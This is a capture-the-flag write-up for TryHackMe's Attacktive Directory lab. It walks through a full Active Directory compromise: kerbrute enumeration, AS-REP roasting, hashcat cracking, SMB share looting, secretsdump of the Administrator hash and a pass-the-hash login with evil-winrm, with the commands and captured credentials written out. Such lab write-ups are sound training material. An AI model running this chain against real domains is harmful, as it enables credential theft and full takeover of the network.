#tryhackme #ctf
# Attacktive Directory
---

## Nmap
|Port|State|Service|Version|
|----|-----|-------|-------|
|53/tcp |  open|  domain |  Simple DNS Plus|
|80/tcp |  open|  http   |  Microsoft IIS httpd 10.0|
|88/tcp |  open|  kerberos-sec|  Microsoft Windows Kerberos (server time: 2021-08-27 05:11:19Z) |
|135/tcp|  open|  msrpc  |       Microsoft Windows RPC|
|139/tcp|  open|  netbios-ssn |  Microsoft Windows netbios-ssn |
|389/tcp|  open|  ldap   |       Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name) |
|445/tcp|  open|  microsoft-ds?| |
|464/tcp|  open|  kpasswd5? | |
|593/tcp|  open|  ncacn_http |   Microsoft Windows RPC over HTTP 1.0|
|636/tcp|  open|  tcpwrapped ||
|3389/tcp| open|  ms-wbt-server| Microsoft Terminal Services|

## Kerbrute
### User enumeration
add domain in the hosts file

download the userlist.txt and passwordlist.txt from the given links using wget
- `wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt`
- `wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt`

Enumerate users
`/path/to/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt`

- *Found users:*
	- james
	- svc-admin
	- robin
	- darkstar
	- administrator
	- backup

### ASREP Roasting
Find GetNPUsers.py
`locate GetNPUSers.py`

Run
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass | tee ~/hash.txt`
to get the ticket for svc-admin and save it in a file hash.txt

- *Found TGT for svc-admin*
>\$krb5asrep\$23\$svc-admin@SPOOKYSEC.LOCAL:ad88a8a6300efed3b329545d8438d6b0$d6884c9d7f70645c5e8e2fee01fb8e9634f46267a0a39895f995c0dcd28852f53532ff7cba4c636b7b6875313253fe0bd12f260881c5730c32e7eb5898ed478ad0a70ee3aa7318505241ac41fd9e10db06dfbeada91a1ecc5661af33d6b35c8743728e337a452d756a3e1a476f49e17e8df6482b117ab7631cfb28bb695edb3150e21d654c55c658e12b016f31b830dce05c12dad38a25a7282c277f6fc9945995e2ca21b79544e0172a3ee0c425781f9aa2b3a8bb49a7dda6ff4040b5bcd76a8b4348b843c1e17ba40cbc98b385348383d7483e9c60464e3d936c3b659a69cd9f7a31fa4ba038f448c2862186c4705d3e88

Use hashcat to crack it (find hashcat mode [here](https://hashcat.net/wiki/doku.php?id=example_hashes))
`hashcat -m 18200 -a 0 hash.txt passwordlist.txt`

- *Found password: **management2005** *

Now list all the share using the user: svc-admin and password: management2005
`smbclient -L spookysec.local -U svc-admin`

- *Found 6 shares:
	- ADMIN$
	- backup
	- C$
	- IPC$
	- NETLOGON
	- SYSVOL

There is only 1 share that we can connect to: **backup**

Connect it using
`smbclient \\\\spookysec\\backup -U svc-admin`

- *Found backup_credentials.txt*
Download it to attacker machine using
`get backup_credentials.txt`

Read the contents
`cat backup_credentials.txt`
> YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

Looks like its base64 encoded. Decode it using any online decoder or `bas64 -d` command
`cat backup_credentials.txt | base64 -d`
>backup@spookysec.local:backup2517860

Use the secretsdump.py from the impacket library to dump all the password hashes associated with this account (essentially all the hashes as this is a backup of Domain Controller)

However, we are only interested in hashes for Administrator so we can gain full control of the DC

Run
`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@spookysec.local -just-dc-user Administrator`

- *Found NTLM hash for Administator **0e0363213e37b94221497260b0bcb4fc** *

Install Evil-WinRM
`gem install evil-winrm`

Use evil-winrm to log in to Administrator
`evil-winrm -H 0e0363213e37b94221497260b0bcb4fc -u Administrator -i <machine-ip>`

Now find all the flags located on desktops of all users
To see the flag
`type <filename.txt>`

Files with flags:
Administrator - root.txt
svc-admin - user.txt.txt
backup - PrivEsc.txt

- *[FLAG 1]*
- *[FLAG 2]*
- *[FLAG 3]*

---

